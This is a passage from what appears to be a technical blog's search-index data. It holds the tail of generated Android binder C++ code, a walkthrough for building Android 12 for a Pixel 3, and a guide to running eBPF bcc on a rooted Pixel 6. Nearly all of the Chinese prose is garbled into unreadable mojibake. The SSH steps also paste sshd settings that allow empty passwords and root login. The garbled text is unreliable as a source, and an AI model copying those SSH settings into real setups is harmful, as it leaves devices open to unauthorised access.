(((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(getDeclaredInstances(in_iface, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeUtf8VectorAsUtf16Vector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_updatableViaApex: &#123; ::std::string in_name; ::std::optional&lt;::std::string> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(updatableViaApex(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeUtf8AsUtf16(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_registerClientCallback: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> in_service; ::android::sp&lt;::android::os::IClientCallback> in_callback; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_service); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_callback); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(registerClientCallback(in_name, in_service, in_callback)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_tryUnregisterService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> in_service; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_service); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(tryUnregisterService(in_name, in_service)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_getServiceDebugInfo: &#123; ::std::vector&lt;::android::os::ServiceDebugInfo> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; ::android::binder::Status _aidl_status(getServiceDebugInfo(&amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeParcelableVector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; default: &#123; _aidl_ret_status = ::android::BBinder::onTransact(_aidl_code, _aidl_data, _aidl_reply, _aidl_flags); &#125; break; &#125; if (_aidl_ret_status == ::android::UNEXPECTED_NULL) &#123; _aidl_ret_status = ::android::binder::Status::fromExceptionCode(::android::binder::Status::EX_NULL_POINTER).writeToParcel(_aidl_reply); &#125; return _aidl_ret_status;&#125;&#125; // namespace os&#125; // namespace android# å‚è€ƒèµ„æ–™ gityuan å¤§ä½¬çš„ Binder ç³»åˆ— ç¬¬ 6 ç«  æ·±å…¥ç†è§£ Binder Android 12 ç³»ç»Ÿæºç åˆ†æ | Native Binder ä»£ç å˜è¿ Android æ·±å…¥æµ…å‡ºä¹‹ Binder æœºåˆ¶ ç†è§£ Android Binder æœºåˆ¶ (2/3)ï¼šC++ å±‚","categories":[],"tags":[]},{"title":"pixel3å®‰å“ç³»ç»Ÿç¼–è¯‘åŠåˆ·å…¥è¿‡ç¨‹è®°å½•","slug":"android-platform-compile","date":"2024-06-20T09:33:17.000Z","updated":"2024-06-20T13:56:09.000Z","comments":true,"path":"android-platform-compile/","link":"","permalink":"https://oacia.dev/android-platform-compile/","excerpt":"","text":"æƒ³è¦ä¸‹è½½å¹¶ç¼–è¯‘å®‰å“ç³»ç»Ÿï¼Œè¯·å¿…é¡»é¢„ç•™è‡³å°‘ 250G åŠä»¥ä¸Šçš„ç©ºä½™ç©ºé—´ï¼Œå¹¶ä¿æŒä»£ç†è¿æ¥ç¨³å®šï¼Œå¦åˆ™å°†å¯¼è‡´ä¸‹è½½å¤±è´¥å¹¶ä»å¤´ä¸‹è½½ï¼ # å®‰å“ç³»ç»Ÿç¼–è¯‘ç¯å¢ƒé…ç½® # ä¸ºè™šæ‹Ÿæœºé…ç½®ä»£ç† # æŸ¥çœ‹è™šæ‹Ÿæœºä»£ç†åœ°å€ æ‰“å¼€ clash for windows , å¹¶æ‰“å¼€ Allow LAN çš„å¼€å…³ï¼Œéšåç‚¹å‡» network interfaces è¯·æ³¨æ„æˆ‘çš„è™šæ‹Ÿæœºä½¿ç”¨çš„ç½‘ç»œè¿æ¥æ–¹å¼ä¸º NAT æ¨¡å¼ï¼Œæ‰€ä»¥éœ€è¦å…³æ³¨ VMnet8 çš„åœ°å€ï¼Œæ‰€ä»¥å¯¹äºè¯¥è™šæ‹Ÿæœºï¼Œä»£ç†åœ°å€ä¸º 192.168.27.1 , ç«¯å£å°±æ˜¯ clash ä¸­ Port é€‰é¡¹æ‰€æ˜¾ç¤ºçš„ç«¯å£ # å¯ç”¨è™šæ‹Ÿæœºä»£ç† ä¾æ¬¡ç‚¹å‡»å¦‚ä¸‹é€‰é¡¹è¿›å…¥ä»£ç†é…ç½® è¾“å…¥ä»£ç†åœ°å€ä¿å­˜å³å¯ # é…ç½® docker ubuntu é•œåƒ # å®‰è£… docker sudo apt install docker.io# docker pull ä»£ç†é…ç½® sudo mkdir -p /etc/systemd/system/docker.service.dsudo gedit /etc/systemd/system/docker.service.d/proxy.confè¾“å…¥ä»¥ä¸‹ä»£ç†æœåŠ¡å™¨å†…å®¹ [Service]Environment=\"HTTP_PROXY=http://192.168.27.1:7890/\"Environment=\"HTTPS_PROXY=http://192.168.27.1:7890/\"Environment=\"NO_PROXY=localhost,127.0.0.1\"# åˆ·æ–°é…ç½®å¹¶é‡å¯ docker æœåŠ¡ sudo systemctl daemon-reloadsudo systemctl restart docker# docker é•œåƒä»£ç†é…ç½® sudo mkdir -p ~/.docker/sudo gedit ~/.docker/config.jsonè¾“å…¥ä»¥ä¸‹å†…å®¹ &#123; \"proxies\": &#123; \"default\": &#123; \"httpProxy\": \"http://192.168.27.1:7890/\", \"httpsProxy\": \"http://192.168.27.1:7890/\", \"noProxy\": \"localhost,127.0.0.1\" &#125; &#125;&#125;# ä¸‹è½½ Ubuntu é•œåƒ docker pull ubuntu# è¿è¡Œ Ubuntu é•œåƒ docker run --privileged -it --net host --name aplatform ubuntu /bin/bash# å®‰è£… sudo,vim apt-get updateapt-get install vimapt-get install sudo# ä¿®æ”¹ apt-get çš„è½¯ä»¶æºä¸ºé˜¿é‡Œæº sudo cp /etc/apt/sources.list /etc/apt/sources.list_backupsudo vim /etc/apt/sources.listæ›¿æ¢ä¸ºå¦‚ä¸‹å†…å®¹ deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse# deb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverseéšåå°† apt-get æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ sudo apt-get updatesudo apt-get upgradesudo apt-get install build-essential# å®‰è£…å¿…è¦çš„åº“ sudo apt-get install git-core gnupg flex bison build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 libncurses5 x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig libssl-dev bc kmod cpio git curl rsync# ä¸º git é…ç½®åŸºæœ¬ä¿¡æ¯ git config --global user.email \"xxx@gmail.com\"git config --global user.name \"xxx\"git config --global http.proxy 192.168.27.1:7890# å®‰è£… repo mkdir ~/bincurl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repochmod a+x ~/bin/repo# ä¿®æ”¹ repo çš„ä¸‹è½½æºä¸ºæ¸…åæºï¼Œå¹¶æ·»åŠ  repo è‡³å…¨å±€å˜é‡ # æ‰“å¼€å…¨å±€å˜é‡é…ç½®æ–‡ä»¶ sudo vim ~/.bashrc# æ·»åŠ å…¨å±€å˜é‡ åœ¨æœ«å°¾æ·»åŠ è¿™ä¸‰è¡Œå¹¶ä¿å­˜ # repoexport REPO_URL='https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/'export PATH=\"~/bin:$PATH\"# ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ source ~/.bashrc# å®‰è£… python å¦‚æœä½¿ç”¨ python --version æœ‰æ‰“å° python ç‰ˆæœ¬çš„è¯ï¼Œé‚£ä¹ˆè¿™ä¸€æ­¥å°±ä¸éœ€è¦äº†ï¼Œå¦‚æœ docker ä¸­æ²¡æœ‰å®‰è£… python , åœ¨ docker å†…ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£… sudo apt-get install software-properties-commonadd-apt-repository ppa:deadsnakes/ppasudo apt install python3.9sudo ln -s /usr/bin/python3 /usr/bin/python# ä¿®æ”¹äº¤æ¢åŒºå¤§å° ä¸ºäº†é˜²æ­¢ç¼–è¯‘æºç çš„è¿‡ç¨‹ä¸­ç”±äºäº¤æ¢åŒºä¸è¶³è€Œå¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»ä¿®æ”¹è™šæ‹Ÿæœºçš„äº¤æ¢åŒºçš„å¤§å° # å¦‚æœæç¤º No such file or directoryï¼Œé‚£å°±ç›´æ¥è¿›è¡Œä¸‹é¢è®¾ç½®äº¤æ¢åŒºçš„æ“ä½œsudo swapoff /swapfilesudo rm /swapfile# è®¾ç½®äº† 32g äº¤æ¢åŒºï¼Œé˜²æ­¢ç¼–è¯‘å¤±è´¥ï¼Œæ‰§è¡Œä¸‹åˆ—å‘½ä»¤éœ€è¦èŠ±è´¹ä¸€æ®µæ—¶é—´ï¼Œå¦‚æœæ‰§è¡Œå‘½ä»¤åæ²¡æœ‰è¾“å‡ºï¼Œè¯·è€å¿ƒç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæ¯•sudo dd if=/dev/zero of=/swapfile bs=1GB count=32sudo chmod 600 /swapfilesudo mkswap -f /swapfilesudo swapon /swapfile# å®‰å“ç³»ç»Ÿæºç ä¸‹è½½ # æŸ¥çœ‹ android ç‰ˆæœ¬ è¿›å…¥ä»£å·ï¼Œæ ‡è®°å’Œ build å·æ¥æŸ¥çœ‹å®‰å“ç³»ç»Ÿçš„ç‰ˆæœ¬ å¦‚æœæ˜¯é¢„è£…çš„ç³»ç»Ÿï¼Œé‚£ä¹ˆ kernel ç‰ˆæœ¬å’Œç³»ç»Ÿç‰ˆæœ¬æ˜¯æœ‰å¯¹åº”å…³ç³»çš„ï¼Œä¾‹å¦‚æˆ‘ç»™ pixel3 åˆ·å…¥çš„ç³»ç»Ÿä¸º blueline-sp1a.210812.016.c2-factory-fa981d87 , é‚£ä¹ˆåœ¨ä¸Šé¢æåˆ°çš„ç½‘å€å†…æ‰¾åˆ°è¯¥å®‰å“ç³»ç»Ÿè¯¥ build ID æ‰€å¯¹åº”çš„å®‰å“ç³»ç»Ÿç‰ˆæœ¬ android-12.0.0_r34 å¦‚å›¾æ‰€ç¤º # ä¸‹è½½ è¾“å…¥å¦‚ä¸‹å‘½ä»¤æ¥è¿›è¡Œå®‰å“ç³»ç»Ÿæºç ä¸‹è½½ï¼Œåˆ†æ”¯å°±é€‰æ‹©æˆ‘ä»¬ä¹‹å‰æŸ¥æ‰¾åˆ°çš„é‚£ä¸ªåˆ†æ”¯ mkdir android-platform &amp;&amp; cd android-platformrepo init -u https://android.googlesource.com/platform/manifest -b android-12.0.0_r34 --depth=1repo sync -j4# å®‰å“ç³»ç»Ÿç¼–è¯‘ åœ¨æºç ä¸‹è½½å®Œæˆä¹‹åï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨ envsetup.sh è®¾ç½®æ„å»ºç¯å¢ƒ source build/envsetup.shä¹‹åä½¿ç”¨ lunch å‘½ä»¤é€‰æ‹©ç›®æ ‡ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¾“å…¥ lunch æ¥æŸ¥çœ‹å¯ä¾›ç¼–è¯‘çš„ç¼–è¯‘ lunchåœ¨ google è®¾å¤‡ä»£å·ä¸­å¯ä»¥çŸ¥é“ pixel3 çš„è®¾å¤‡ä»£å·æ˜¯ blueline æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è®¾ç½®å¥½ç¼–è¯‘ç›®æ ‡ lunch aosp_blueline-userdebugè¿™é‡Œå‡ºç°äº† Build sandboxing disabled due to nsjail error æŠ¥é”™ï¼Œè¿™ä¸ªæŠ¥é”™åº”è¯¥æ˜¯ä¸ä¼šå½±å“åç»­çš„ç³»ç»Ÿç¼–è¯‘çš„ lunchè‡ªå®šä¹‰å‘½ä»¤ç»„åˆ lunch product_name-release-build_variantæ­¤å­—ç¬¦ä¸²çš„ç»„æˆéƒ¨åˆ†åŒ…æ‹¬ï¼š product_name æ˜¯æˆ‘ä»¬è¦æ„å»ºçš„äº§å“çš„åç§°ï¼Œä¾‹å¦‚ aosp_cf_x86_64_phone æˆ– aosp_husky ã€‚ç‰¹å®šçš„ product_name å¯ä»¥éµå¾ªæˆ‘ä»¬è‡ªå·±çš„è®¾å¤‡æ ¼å¼ï¼Œä½† Google ä¸ºå…¶è®¾å¤‡é‡‡ç”¨çš„æ ¼å¼åŒ…å«ä»¥ä¸‹ç»„ä»¶ï¼š aosp æ˜¯æŒ‡ Android å¼€æºå¹³å°ã€‚ ï¼ˆå¯é€‰ï¼‰å¦‚æœè¦åœ¨ Cuttlefish æ¨¡æ‹Ÿå™¨ä¸­è¿è¡Œç›®æ ‡ï¼Œåˆ™åŒ…å« cf ã€‚ æ¶æ„å’Œç¡¬ä»¶ï¼ˆä»£å·ï¼‰ï¼Œä¾‹å¦‚ x86_64_phone æˆ– husky ï¼ˆPixel 8 Pro çš„ä»£å·ï¼‰ã€‚å¦‚éœ€æŸ¥çœ‹ Google è®¾å¤‡çš„ä»£å·åˆ—è¡¨ï¼Œè¯·å‚é˜…è®¾å¤‡ä»£å·ã€‚ æ‰€ä»¥å¯¹äº pixel3 æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°† product_name é…ç½®ä¸º aosp_blueline å°† release è®¾ç½®ä¸º trunk_staging ã€‚ æ­¤å­—ç¬¦ä¸²çš„ build_variant éƒ¨åˆ†å¯ä»¥æ˜¯ä¸‹è¡¨ä¸­çš„ä¸‰ä¸ªå€¼ä¹‹ä¸€ï¼Œè¿™é‡Œæˆ‘é€‰æ‹© user ä¸ºç›®æ ‡æ¥æ„å»ºï¼Œæ¯•ç«Ÿè°çŸ¥é“ä¸‡ä¸€ç¼–è¯‘æˆ debug ä¼šä¸ä¼šæœ‰ app æ£€æµ‹åˆ°ç‰¹å¾äº†å˜ï½ build_variant æ¦‚è¿° è¯´æ˜ ro.secure ro.debuggable ro.kernel.android.checkjni adb åŠŸèƒ½ Proguard æ··æ·†å™¨ DEXPREOPT é¢„å…ˆç¼–è¯‘ä¼˜åŒ– user release ç‰ˆæœ¬ æ­¤ build å˜ä½“æä¾›æœ‰é™çš„å®‰å…¨è®¿é—®æƒé™ï¼Œé€‚ç”¨äºç”Ÿäº§ç¯å¢ƒã€‚ è®¾å®šå±æ€§ ro.secure=1ï¼Œæ‰“å¼€å®‰å…¨æ£€æŸ¥åŠŸèƒ½ è®¾å®šå±æ€§ ro.debuggable=0ï¼Œå…³é—­åº”ç”¨è°ƒè¯•åŠŸèƒ½ è®¾å®šå±æ€§ ro.kernel.android.checkjni=0ï¼Œå…³é—­ JNI è°ƒç”¨æ£€æŸ¥ å…³é—­ æ‰“å¼€ æ‰“å¼€ userdebug éƒ¨åˆ† debug ç‰ˆæœ¬ æ­¤ build å˜ä½“å¯å¸®åŠ©è®¾å¤‡å¼€å‘è€…äº†è§£å¼€å‘ä¸­ç‰ˆæœ¬çš„æ€§èƒ½å’ŒåŠŸè€—ã€‚ä½¿ç”¨ userdebug build è¿›è¡Œå¼€å‘æ—¶ï¼Œè¯·éµå¾ª userdebug æŒ‡å—ã€‚ è®¾å®šå±æ€§ ro.secure=1ï¼Œæ‰“å¼€å®‰å…¨æ£€æŸ¥åŠŸèƒ½ è®¾å®šå±æ€§ ro.debuggable=1ï¼Œå¯ç”¨åº”ç”¨è°ƒè¯•åŠŸèƒ½ è®¾å®šå±æ€§ ro.kernel.android.checkjni=0ï¼Œå…³é—­ JNI è°ƒç”¨æ£€æŸ¥ æ‰“å¼€ æ‰“å¼€ æ‰“å¼€ eng debug ç‰ˆæœ¬ æ­¤ build å˜ä½“çš„æ„å»ºæ—¶é—´æ›´çŸ­ï¼Œå¦‚æœæ‚¨ä¸åœ¨æ„æ€§èƒ½å’ŒåŠŸè€—ï¼Œå®ƒæœ€é€‚åˆç”¨äºæ—¥å¸¸å¼€å‘ã€‚ è®¾å®šå±æ€§ ro.secure=0ï¼Œå…³é—­å®‰å…¨æ£€æŸ¥åŠŸèƒ½ è®¾å®šå±æ€§ ro.debuggable=1ï¼Œå¯ç”¨åº”ç”¨è°ƒè¯•åŠŸèƒ½ è®¾å®šå±æ€§ ro.kernel.android.checkjni=1ï¼Œå¯ç”¨ JNI è°ƒç”¨æ£€æŸ¥ æ‰“å¼€ å…³é—­ å…³é—­ æ‰€ä»¥å¯¹äºæˆ‘çš„ pixel3 æ¥è¯´ç¼–è¯‘å‘½ä»¤å¦‚ä¸‹ lunch aosp_blueline-trunk_staging-userä½†æ˜¯æ²¡æƒ³åˆ°çš„æ˜¯ç«Ÿç„¶æŠ¥é”™äº†ï¼Ÿä¼°è®¡æ˜¯ä¸èƒ½ä»¥ user ä½œä¸ºç›®æ ‡ç¼–è¯‘ï¼Ÿä¹‹åçœ‹çœ‹ userdebug ä¼šä¸ä¼šè¢«æ£€æµ‹åˆ°å†å†³å®šæ˜¯å¦ç»§ç»­ç ”ç©¶æ­¤å¤„çš„æŠ¥é”™ ç„¶åå¼€å§‹ç¼–è¯‘ï¼Œç»™è™šæ‹Ÿæœºåˆ†é… 12 æ ¸çš„è¯ç¬¬ä¸€æ¬¡å¤§æ¦‚éœ€è¦ä¸¤ä¸ªå°æ—¶å·¦å³å¯ä»¥ç¼–è¯‘å®Œæˆï¼Œåé¢å†æ¬¡ç¼–è¯‘çš„é€Ÿåº¦å°±å¾ˆå¿«äº† make -j8ç¼–è¯‘å®Œæˆåä¼šç”Ÿæˆä¸€ä¸ª vbmeta.img æ–‡ä»¶ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬è¦åˆ·å…¥çš„ä¹Ÿæ˜¯è¿™ä¸€ä¸ªæ–‡ä»¶ # ç¼–è¯‘åçš„é•œåƒåˆ·å…¥æ‰‹æœº //TODO 6.24 å·å‘¨ä¸€çš„æ—¶å€™åˆ·è¿›å»è¯•è¯•çœ‹åŠŸèƒ½æ˜¯ä¸æ˜¯æ­£å¸¸ï¼# å‚è€ƒèµ„æ–™ æ„å»º Android Android ç¼–è¯‘é€‰é¡¹ engã€userã€userdebug çš„åŒºåˆ«","categories":[],"tags":[]},{"title":"EBPF android bccåˆä½“éªŒ","slug":"android-bcc","date":"2024-05-07T07:31:28.000Z","updated":"2024-05-12T05:52:32.908Z","comments":true,"path":"android-bcc/","link":"","permalink":"https://oacia.dev/android-bcc/","excerpt":"","text":"pixel6 åˆ°æ‰‹çš„ç¬¬ä¸€ä»¶äº‹ï¼Œå½“ç„¶æ˜¯å»ç©ç©çœ‹ ebpf äº†ï½ebpf çš„æ— ç—• hook å¬ä¸Šå»å°±æ„Ÿè§‰ç›¸å½“çš„å¼ºå¤§ï¼Œå»å®˜ç½‘çœ‹äº†ä¸€ä¸‹ ebpf çŸ¥ååº¦æ’åå‰å‡ çš„é¡¹ç›®ï¼Œé‚£é bcc è«å±äº†ï¼Œç”¨ python å°±å¯ä»¥è¿è¡Œ ebpf ä»£ç ï¼Œè™½ç„¶ ebpf çš„æ ¸å¿ƒä»£ç è¿˜æ˜¯ C å†™çš„ï¼Œä½†æ˜¯ç”¨ python å»æ‰§è¡Œå°±æ„Ÿè§‰ååˆ†çš„èˆ’é€‚ åœ¨ç½‘ä¸Šä¹Ÿæ‰¾åˆ°äº†ä¸‰ç¯‡éå¸¸è¯¦ç»†çš„ Android bcc ç¼–è¯‘æ•™ç¨‹ï¼Œå‰äººç§æ ‘ï¼Œåäººä¹˜å‡‰ ^.^ å¯ä»¥è¯•è¯•çœ‹ ebpf ç©¶ç«Ÿæ˜¯ä»€ä¹ˆæ ·å­çš„å•¦ eBPF on Android ä¹‹ bcc ç¯å¢ƒå‡†å¤‡ â€”â€”eadb åŸç‰ˆ [åŸåˆ›] 60 ç§’å­¦ä¼šç”¨ eBPF-BCC hook ç³»ç»Ÿè°ƒç”¨ ( 2 ) hook å®‰å“æ‰€æœ‰ syscall eBPF on Android ä¹‹ bcc ç¼–è¯‘ä¸ä½“éªŒ # bcc ç¯å¢ƒæ­å»º æ¥ä¸‹æ¥è¿›è¡Œ bcc çš„ç¯å¢ƒæ­å»ºï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ eadb åœ¨æ‰‹æœºä¸­é…ç½® Debian ç³»ç»Ÿï¼Œå¹¶é€šè¿‡ ssh è®© Windows ä¸Šçš„ vscode å¯ä»¥è¿æ¥æ‰‹æœºä¸­çš„ Debian æƒ³è¦ä½¿ç”¨ bcc çš„å…¨éƒ¨åŠŸèƒ½ï¼Œé¦–å…ˆæ£€æŸ¥ linux å†…æ ¸ç‰ˆæœ¬ï¼Œæˆ‘çš„å†…æ ¸ç‰ˆæœ¬ä¸º 5.10 uname -aç„¶åæ£€æŸ¥ BPF çš„é…ç½®æ˜¯å¦å¼€å¯ oriole:/ # zcat /proc/config.gz | grep PROBECONFIG_GENERIC_IRQ_PROBE=yCONFIG_ARCH_SUPPORTS_UPROBES=yCONFIG_KPROBES=yCONFIG_UPROBES=yCONFIG_KRETPROBES=yCONFIG_HAVE_KPROBES=yCONFIG_HAVE_KRETPROBES=y# CONFIG_TEST_ASYNC_DRIVER_PROBE is not setCONFIG_GENERIC_CPU_AUTOPROBE=yCONFIG_TIMER_PROBE=yCONFIG_KPROBE_EVENTS=yCONFIG_UPROBE_EVENTS=yCONFIG_PROBE_EVENTS=y# CONFIG_BPF_KPROBE_OVERRIDE is not set# CONFIG_KPROBE_EVENT_GEN_TEST is not setéšåä½¿ç”¨ magisk root æ‰‹æœºï¼Œç„¶åå®‰è£… MagiskSSH ubuntu ä¸­åœ¨ root æƒé™ä¸‹å®‰è£… adb å’Œ fastboot apt install adb,fastbootéšååœ¨ ubuntu ä¸­è¾“å…¥ä¸‹åˆ—å‘½ä»¤ç”Ÿæˆ rsa å¯†é’¥ï¼Œä¸€è·¯å›è½¦ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"å°†å…¬é’¥æ¨é€åˆ°æ‰‹æœºä¸­ adb push ~/.ssh/id_rsa.pub /data/local/tmpå°†å…¬é’¥è¿½åŠ å†™å…¥ MagiskSSH çš„é…ç½®æ–‡ä»¶ä¸­ cat /data/local/tmp/id_rsa.pub >> /data/ssh/shell/.ssh/authorized_keyschmod 600 /data/ssh/shell/.ssh/authorized_keyscat /data/local/tmp/id_rsa.pub >> /data/ssh/root/.ssh/authorized_keyschmod 600 /data/ssh/root/.ssh/authorized_keysä½¿ç”¨ MT ç®¡ç†å™¨ç¼–è¾‘ /data/ssh/sshd_config , æŠŠä¸‹é¢çš„å†…å®¹ç²˜è´´åˆ°æ–‡ä»¶å¼€å¤´å¹¶ä¿å­˜å³å¯ Port 22225PasswordAuthentication yesPermitEmptyPasswords yesPermitUserEnvironment yes é‡å¯ sshd æœåŠ¡ /data/adb/modules/ssh/opensshd.init stop/data/adb/modules/ssh/opensshd.init startéšååœ¨ ubuntu ä¸­ä¸‹è½½ eadb å’Œ debianfs åœ¨æ‰‹æœºçš„ WLAN ç½‘ç»œè¯¦æƒ…é‡Œæ‰¾åˆ°æ‰‹æœºçƒ­ç‚¹çš„ IP åœ°å€ é…ç½® debian ç¯å¢ƒ ./eadb --ssh root@192.168.50.191 -p 22225 prepare -a debianfs-arm64-full.tar.gzç„¶åè¿è¡Œä¸‹é¢çš„å‘½ä»¤å°±å¯ä»¥è¿æ¥ä¸Šäº† ./eadb --ssh root@192.168.50.191 -p 22225 shellä¸º Debian é…ç½® ssh apt-get updateapt-get install sshæ‰“å¼€ /etc/ssh/sshd_config vim /etc/ssh/sshd_configå¹¶æŒ‰ä¸‹ ctrl+shift+v ç²˜è´´ä¸‹åˆ—çš„å†…å®¹ AuthorizedKeysFile .ssh/authorized_keysPort 11111PubkeyAuthentication yesPermitRootLogin yesPasswordAuthentication yesGSSAPIAuthentication no # åŠ é€ŸSSHUseDNS no # åŠ é€ŸSSHåœ¨è™šæ‹Ÿæœº ubuntu ä¸­æŸ¥çœ‹ç”Ÿæˆçš„å…¬é’¥ cat ~/.ssh/id_rsa.pubåœ¨æ‰‹æœº Debian ä¸­æ‰‹åŠ¨ç²˜è´´å¯¼å…¥å…¬é’¥ vim id_rsa.pubåœ¨æ‰‹æœº Debian ä¸­å¢åŠ å…¬é’¥å¹¶é…ç½®æƒé™ cat id_rsa.pub >> ~/.ssh/authorized_keyschmod 600 ~/.ssh/authorized_keys;chmod 700 ~/.sshservice ssh restart # æ‰‹æœºæ¯æ¬¡é‡å¯åï¼Œç¬¬ä¸€æ¬¡è¿›å…¥ debian, å¯èƒ½éƒ½éœ€è¦æ‰‹åŠ¨å¯åŠ¨ä¸‹ ssh æœåŠ¡ å¦‚æœæ²¡æœ‰ ~/.ssh/authorized_keys æ–‡ä»¶ï¼Œæ–°å»ºä¸€ä¸ªå°±è¡Œäº† mkdir ~/.ssh;touch ~/.ssh/authorized_keys ä¿®æ”¹ Debian çš„ root å¯†ç  passwd rootåœ¨ ubuntu ä¸­æŸ¥çœ‹ç§é’¥ï¼Œç„¶åå¤åˆ¶åˆ° Windows çš„ä¸€ä¸ªæ–‡ä»¶ id_rsa ä¸­ cat ~/.ssh/id_rsaç„¶åæ‰“å¼€ C:\\Users\\admin\\.ssh\\config , é…ç½® ssh, å¹¶åœ¨ vscode ä¸­å®‰è£… ssh æ’ä»¶ ä¹‹åå…³é—­è™šæ‹Ÿæœºè®©æ‰‹æœºçš„ USB è¿ä¸Š Windows, åœ¨ vscode ä¸­å°±å¯ä»¥è¿ä¸Šå•¦ vscode ç¬¬ä¸€æ¬¡è¿æ¥ Debian, ä¼šåœ¨ Debian ä¸­å®‰è£… vscode æœåŠ¡å™¨ï¼Œå¦‚æœä¸å¼€ä»£ç†çš„è¯é€Ÿåº¦ä¼šç›¸å½“ç›¸å½“çš„æ…¢ï¼Œè¦æƒ³ç»™ Debian æŒ‚ä»£ç†çš„è¯ï¼Œåªè¦åœ¨æ‰‹æœºä¸­æŠŠ Clash å¼€èµ·æ¥å°±å¯ä»¥å•¦ # bcc ç¼–è¯‘è¿è¡Œ ç¯å¢ƒæ­å»ºå¥½äº†ä¹‹åï¼Œå°±å¯ä»¥ç¼–è¯‘ bcc äº† å…ˆæŠŠ bcc ä¸‹è¿‡æ¥ git clone https://github.com/iovisor/bcc.gitç¼–è¯‘ bcc mkdir bcc/build; cd bcc/buildcmake ..makeæˆ‘åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­é‡åˆ°äº†å¦‚ä¸‹çš„æŠ¥é”™ å…ˆè£…ä¸ª pip wget https://bootstrap.pypa.io/get-pip.pypython get-pip.pyç„¶åå†å®‰è£… setuptools wget https://files.pythonhosted.org/packages/af/e7/02db816dc88c598281bacebbb7ccf2c9f1a6164942e88f1a0fded8643659/setuptools-45.0.0-py2.py3-none-any.whlpip install setuptools-45.0.0-py2.py3-none-any.whlåæ¥åˆæŠ¥é”™ zip æ²¡å®‰è£… è£…ä¸€ä¸ª zip apt-get install zipé‡æ–° make ä¹‹åç¼–è¯‘æˆåŠŸï½ ç„¶åæŠŠ bcc å®‰è£…ä¸€ä¸‹ make 